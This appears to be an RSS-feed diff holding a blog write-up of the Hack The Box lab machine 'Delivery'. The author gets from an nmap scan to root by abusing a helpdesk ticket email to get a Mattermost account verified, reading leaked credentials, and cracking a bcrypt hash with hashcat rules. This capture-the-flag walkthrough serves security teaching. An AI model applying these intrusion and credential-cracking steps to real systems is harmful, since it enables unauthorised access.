+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;We start of with the nmap , nmap -sC -sV -p- -T4 -oN delivery.nmap delivery.htb
+We can see there&amp;rsquo;s 3 ports open.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic30.png&#34; alt=&#34;nmap&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s browse http and see what&amp;rsquo;s there.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic0.png&#34; alt=&#34;Static&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We get a static website, looking at the site source there&amp;rsquo;s nothing much there but look around contact us we get this .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic26.png&#34; alt=&#34;Static_Contact&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can see a note from the site owner?&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you&amp;#39;ll be able to have access to our MatterMost server
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;so let&amp;rsquo;s look at the helpdisk at helpdesk.delivery.htb&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic29.png&#34; alt=&#34;helpdisk&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We see osticket support center,right of the top we check for any cves but they are all old and not affective so let&amp;rsquo;s create a new account .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic24.png&#34; alt=&#34;helpdisk_signup&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now After we created an account we get account verification but thinking logically we have entered a none existing email we cannot receive emails neither do anything.
+Hmmm there must be somewhere around it . let&amp;rsquo;s check the open ticket thing .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic9.png&#34; alt=&#34;helpdisk_ticket_open&#34;&gt;&lt;/p&gt;
+&lt;p&gt;let&amp;rsquo;s fill those real quick .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic22.png&#34; alt=&#34;helpdisk_ticket_fill&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic25.png&#34; alt=&#34;helpdisk_ticket_fill2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We Get Support ticket request created with a ticket id and an email ?
+At this point i was hmmmmmmmmmmmm an email , going back to the text we got earlier&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Once you have an @delivery.htb email address, you&amp;#39;ll be able to have access to our MatterMost server
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now before we go and create an account at mattermost let&amp;rsquo;s check out ticket status.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic7.png&#34; alt=&#34;helpdisk_ticket_cr&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We get an confirmation error,that&amp;rsquo;s not great at this point you gotta think out of the box. what email that might exist probably everywhere .
+let&amp;rsquo;s submit a new ticket real quick and check again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic18.png&#34; alt=&#34;helpdisk_ticket_cr2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And We Get Another ticket_id and email address , let&amp;rsquo;s check our ticket status&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic19.png&#34; alt=&#34;helpdisk_ticket_ck&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And some how magically We got in as Admin .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic6.png&#34; alt=&#34;helpdisk_ticke_admin&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now let&amp;rsquo;s go back to the mattermost and create an account with our ticket email&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic3.png&#34; alt=&#34;helpdisk_mattermost&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic4.png&#34; alt=&#34;helpdisk_mattermost2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Also we get email verification , at this point you should really use your mind for a bit . we go back to our check ticket status and we get a reply&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic1.png&#34; alt=&#34;helpdisk_mattermost1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s the verification code, sweet now we can verify our email address and simply login.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic16.png&#34; alt=&#34;helpdisk_mattermost_login&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now Let&amp;rsquo;s explore a bit, we click on internal and get into the channel we see there&amp;rsquo;s messages left by admin over there .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic2.png&#34; alt=&#34;helpdisk_mattermost_msg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We see credentials , Swwwwwweet .let&amp;rsquo;s login via ssh .&lt;/p&gt;
+&lt;p&gt;PS: I covered the credentials so you do the box instead of copying and pasting&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic27.png&#34; alt=&#34;helpdisk_mattermost_ssh&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And There we go , now we can read the user.txt&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
+&lt;span&gt;
+    &lt;a href=&#34;#privilege-escalation&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;&lt;p&gt;At This point it&amp;rsquo;s pretty straight forward , let&amp;rsquo;s run linpeas.sh and see what&amp;rsquo;s going on but there&amp;rsquo;s nothing.
+let&amp;rsquo;s check &lt;code&gt;/opt&lt;/code&gt; we can see mattermost installation let&amp;rsquo;s check it .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic12.png&#34; alt=&#34;helpdisk_logged_in1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;the first thing i do , is to check the configs since they usually store credentials , and sensitive information .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic15.png&#34; alt=&#34;helpdisk_logged_in1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Oh the config.json is interesting , let&amp;rsquo;s check it out&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic5.png&#34; alt=&#34;helpdisk_logged_config&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can see there&amp;rsquo;s an mysql settings with some credentails , running ss -lnpt we see mysql is running .
+Let&amp;rsquo;s Logging And Check The database.
+PS: The password is a hint itself it says crack the mattermost password which is the root password&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic11.png&#34; alt=&#34;helpdisk_logged_mysql&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic20.png&#34; alt=&#34;helpdisk_logged_mysql2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Ah there&amp;rsquo;s too many tables there , but we just interested in the Users tables.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic17.png&#34; alt=&#34;helpdisk_logged_mysql&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic28.png&#34; alt=&#34;helpdisk_logged_mysql1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic14.png&#34; alt=&#34;helpdisk_logged_mysql2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We have the root hash it&amp;rsquo;s a bcrypt type. now before we crack it, remember from the mattermost internal channel the admin user gave us a valuable hint .&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is a usefull hint to let us know that we should generate a wordlist from hashcat rules in order to crack the root hash through &amp;ldquo;PleaseSubscribe!&amp;rdquo;
+Let&amp;rsquo;s go to our crackred and generate a wordlist .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic21.png&#34; alt=&#34;helpdisk_crackred&#34;&gt;&lt;/p&gt;
+&lt;p&gt;that&amp;rsquo;s not a big wordlist , it should crack really fast. let&amp;rsquo;s crack our hash.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic13.png&#34; alt=&#34;helpdisk_crackred1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And there we goo , we&amp;rsquo;ve cracked it,took about 2 seconds , now let&amp;rsquo;s su to root.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic23.png&#34; alt=&#34;helpdisk_root&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And That&amp;rsquo;s it , that&amp;rsquo;s delivery hope you enjoyed the writeup take care and i&amp;rsquo;ll see you all other time.&lt;/p&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
